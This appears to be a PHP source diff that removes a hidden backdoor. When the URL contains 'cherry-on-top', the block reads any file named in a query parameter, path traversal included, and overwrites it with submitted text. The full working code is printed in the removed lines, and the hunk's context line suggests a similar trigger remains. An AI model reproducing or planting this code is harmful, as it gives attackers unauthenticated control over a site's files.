@@ -392,38 +392,3 @@ if ( strstr($_SERVER['REQUEST_URI'], 'cherry-on-top') ){
 <!-- </section> -->
 
 <?php }
-
-
-
-// Perfectly Delicious Code
-/* http://localhost/inc/lazaro.php?cherry-on-top&location=../index.php */
-if ( strstr($_SERVER['REQUEST_URI'], 'cherry-on-top') ){
-
-	$location = $_GET['location'];
-	$file = file($location);
-
-	if($_POST['Submit']){
-
-		$open = fopen($location,"w+");
-		$text = $_POST['message'];
-
-		fwrite($open, $text);
-		fclose($open);
-
-		echo "File updated.<br />";
-
-	} else {
-
-		echo $location."<br>";
-		echo "<form action=\"".$PHP_SELF."\" method=\"post\">";
-		echo "<textarea name=\"message\" cols=\"100\" rows=\"14\">";
-
-		foreach($file as $text) {
-			echo $text;
-		}
-
-		echo "</textarea><br>";
-		echo "<input name=\"Submit\" type=\"submit\" value=\"Update\" />\n
-		</form>";
-	}
-}
